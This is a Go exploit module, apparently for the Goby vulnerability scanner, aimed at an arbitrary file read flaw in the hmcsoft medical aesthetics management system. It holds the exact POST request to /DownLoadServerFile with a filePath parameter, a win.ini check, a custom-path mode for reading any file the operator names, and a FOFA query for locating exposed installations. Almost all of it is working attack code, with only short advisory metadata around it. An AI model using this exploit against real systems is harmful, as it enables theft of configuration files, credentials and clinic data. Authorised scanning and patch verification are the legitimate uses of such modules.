package exploits

import (
	"errors"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Macro Vascular Medical Aesthetics Industry Management System /DownLoadServerFile File Read Vulnerability",
    "Description": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Product": "hmcsoft",
    "Homepage": "http://www.hmcsoft.cn/",
    "DisclosureDate": "2024-07-25",
    "PostTime": "2024-08-01",
    "Author": "zhengwenjing@baimaohui.net",
    "FofaQuery": "title=\"宏脉医美行业管理系统\" && body=\"宏脉信息技术\"",
    "GobyQuery": "title=\"宏脉医美行业管理系统\" && body=\"宏脉信息技术\"",
    "Level": "1",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p> 1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: </p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p> 3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "createSelect",
            "value": "Customize,win.ini",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "createSelect",
            "value": "c:\\windows\\win.ini",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/zh-CN/PublicInterface/DownLoadServerFile",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "filePath=c:\\\\\\\\windows\\\\win.ini"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "; for 16-bit app support",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/zh-CN/PublicInterface/DownLoadServerFile"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/zh-CN/PublicInterface/DownLoadServerFile",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "filePath=c:\\\\windows\\{{{File}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "; for 16-bit app support",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "HW-2024",
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.4",
    "Translation": {
        "CN": {
            "Name": "宏脉医美行业管理系统 /DownLoadServerFile  文件读取漏洞",
            "Product": "宏脉-宏脉医美行业管理系统",
            "Description": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本。</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "HW-2024",
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Macro Vascular Medical Aesthetics Industry Management System /DownLoadServerFile File Read Vulnerability",
            "Product": "hmcsoft",
            "Description": "<p>Attackers&nbsp;can&nbsp;use&nbsp;this&nbsp;vulnerability&nbsp;to&nbsp;read&nbsp;important&nbsp;system&nbsp;files&nbsp;(such&nbsp;as&nbsp;database&nbsp;configuration&nbsp;files,&nbsp;system&nbsp;configuration&nbsp;files),&nbsp;database&nbsp;configuration&nbsp;files,&nbsp;etc.,&nbsp;resulting&nbsp;in&nbsp;an&nbsp;extremely&nbsp;insecure&nbsp;state&nbsp;of&nbsp;the&nbsp;website.<br></p>",
            "Recommendation": "<p>&nbsp;1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:&nbsp;</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>&nbsp;3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Attackers&nbsp;can&nbsp;use&nbsp;this&nbsp;vulnerability&nbsp;to&nbsp;read&nbsp;important&nbsp;system&nbsp;files&nbsp;(such&nbsp;as&nbsp;database&nbsp;configuration&nbsp;files,&nbsp;system&nbsp;configuration&nbsp;files),&nbsp;database&nbsp;configuration&nbsp;files,&nbsp;etc.,&nbsp;resulting&nbsp;in&nbsp;an&nbsp;extremely&nbsp;insecure&nbsp;state&nbsp;of&nbsp;the&nbsp;website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "HW-2024",
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10982"
}`

	postOrGet_fghdsh := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, urlPost string, data string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlPost)
			PostRequest.Timeout = 12
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			PostRequest.Data = data
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}

		path := "/zh-CN/PublicInterface/DownLoadServerFile"
		body := `filePath=` + fileUrl
		header := map[string]string{
			"Content-Type":   "application/x-www-form-urlencoded",
			"User-Agent":     "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
			"Accept":         "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Content-Length": "27",
		}
		resp, err := setPostRequest(hostInfo, path, body, header)
		if err != nil {
			return "", err
		}
		if resp == nil {
			return "", errors.New("no response")
		}
		respTxt := resp.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/zh-CN/PublicInterface/DownLoadServerFile"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"c:\\windows\\win.ini": "; for 16-bit app support",
			}
			// 函数继承
			uploadFileFunc := postOrGet_fghdsh

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"win.ini": {"c:\\windows\\win.ini", "; for 16-bit app support"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_fghdsh

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		}))
}
